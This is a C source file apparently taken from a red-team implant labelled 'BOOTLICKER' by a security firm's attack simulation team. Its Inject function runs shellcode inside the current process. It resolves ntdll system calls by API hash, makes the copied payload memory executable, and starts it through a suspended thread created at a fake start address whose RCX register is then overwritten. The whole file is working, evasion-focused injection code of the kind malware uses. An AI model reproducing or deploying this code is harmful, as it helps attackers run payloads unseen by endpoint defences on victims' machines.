/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationThread );
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( NtSetContextThread );
	D_API( NtGetContextThread );
	D_API( NtCreateThreadEx );
	D_API( NtResumeThread );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTQUERYINFORMATIONTHREAD		0xf5a0461b /* NtQueryInformationThread */
#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTCREATETHREADEX			0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTRESUMETHREAD			0x5a4bc3d0 /* NtResumeThread */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Inject a shellcoed into the existing process we 
 * are within.
 *
!*/
D_SEC( F ) VOID Inject( _In_ PVOID Buffer, _In_ SIZE_T Length )
{
	API	Api;
	CONTEXT	Ctx;

	DWORD	Prt = 0;
	PVOID	Adr = NULL;
	PVOID	Ptr = NULL;
	SIZE_T	Len = 0;

	HANDLE	Thd = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD ); 
	Api.NtAllocateVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtProtectVirtualMemory   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.NtSetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtGetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtCreateThreadEx         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Set the size */
	Len = Length;

	/* Allocate a block of memory */
	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Ptr, 0, &Len, MEM_COMMIT, PAGE_READWRITE ) ) ) {

		/* Copy over our 'payload' we deploy */
		__builtin_memcpy( Ptr, Buffer, Length );

		/* Set the target payload to RX. Its presumed its not encoded in any form */
		if( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Ptr, &Len, PAGE_EXECUTE_READ, &Prt ) ) ) {
			/* Query information about the start address of the current thread */
			if ( NT_SUCCESS( Api.NtQueryInformationThread( NtCurrentThread(), ThreadQuerySetWin32StartAddress, &Adr, sizeof( Adr ), NULL ) ) ) {
				/* Create a thread pointing @ this fake address suspended */
				if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Adr, NULL, TRUE, 0, 0x1000 * 10, 0, NULL ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					/* Get information about the suspend thread registers */
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {
						Ctx.Rcx = C_PTR( Ptr );
						Ctx.ContextFlags = CONTEXT_FULL;

						/* Set the new values so RtlUserThreadSTart calls them */
						if ( NT_SUCCESS( Api.NtSetContextThread( Thd, &Ctx ) ) ) {
							/* Execute the routine */
							if ( NT_SUCCESS( Api.NtResumeThread( Thd, NULL ) ) ) {

							};
						};
					};
					/* Close the thread handle */

					Api.NtClose( Thd );
				};
			};
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};
